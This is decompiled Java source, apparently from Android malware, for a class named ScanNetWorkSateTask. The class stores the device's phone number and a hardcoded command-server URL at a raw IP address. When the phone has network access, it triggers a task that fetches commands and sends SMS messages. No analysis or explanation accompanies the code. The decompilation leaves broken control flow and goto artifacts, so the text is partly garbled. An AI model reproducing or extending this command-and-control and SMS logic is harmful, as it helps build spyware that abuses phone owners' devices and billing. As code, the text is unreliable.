// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.example.utils;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.util.Log;
import java.io.InputStream;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONObject;

// Referenced classes of package com.example.utils:
//            JSONParser, ScanHttpCmdTask

public final class ScanNetWorkSateTask
    implements Runnable
{

    public ScanNetWorkSateTask(Context context1, String s)
    {
        jParser = new JSONParser();
        commands = null;
        getCommand_url = "http://223.255.198.147/home/get_command.php";
        context = context1;
        phoneNumber = s;
    }

    public void run()
    {
        Exception exception1;
        boolean flag;
        ConnectivityManager connectivitymanager;
        NetworkInfo networkinfo;
        boolean flag1;
        android.net.NetworkInfo.State state;
        android.net.NetworkInfo.State state1;
        try
        {
            Log.i("ScanNetWorkSateTask", "doing");
        }
        catch(Exception exception)
        {
            exception.printStackTrace();
            return;
        }
        connectivitymanager = (ConnectivityManager)context.getSystemService("connectivity");
        flag = false;
        if(connectivitymanager == null)
            break MISSING_BLOCK_LABEL_85;
        networkinfo = connectivitymanager.getActiveNetworkInfo();
        flag = false;
        if(networkinfo == null)
            break MISSING_BLOCK_LABEL_85;
        flag1 = networkinfo.isConnected();
        flag = false;
        if(!flag1)
            break MISSING_BLOCK_LABEL_85;
        state = networkinfo.getState();
        state1 = android.net.NetworkInfo.State.CONNECTED;
        flag = false;
        if(state == state1)
            flag = true;
_L1:
        if(!flag)
            break MISSING_BLOCK_LABEL_177;
        Log.i("ScanNetWorkSateTask", "canSend = true");
_L2:
        if(!flag)
            break MISSING_BLOCK_LABEL_159;
        Log.d("ScanNetWorkSateTask", (new StringBuilder("put sim_no to ScanHttpCmdTask: ---task----")).append(phoneNumber).toString());
        ScanHttpCmdTask scanhttpcmdtask = new ScanHttpCmdTask(context, phoneNumber, "", "");
        scanhttpcmdtask.DoTask();
        scanhttpcmdtask.doSendSMStask();
        return;
        exception1;
        exception1.printStackTrace();
        flag = false;
          goto _L1
        Log.i("ScanNetWorkSateTask", "canSend = false");
          goto _L2
        Exception exception2;
        exception2;
        exception2.printStackTrace();
        return;
          goto _L1
    }

    static InputStream is = null;
    static JSONObject jObj = null;
    static String json = "";
    private final String TAG = "ScanNetWorkSateTask";
    private String cmd;
    private String command;
    JSONArray commands;
    Context context;
    private String getCommand_url;
    JSONParser jParser;
    List params;
    private String phoneNumber;
    private String url;

}
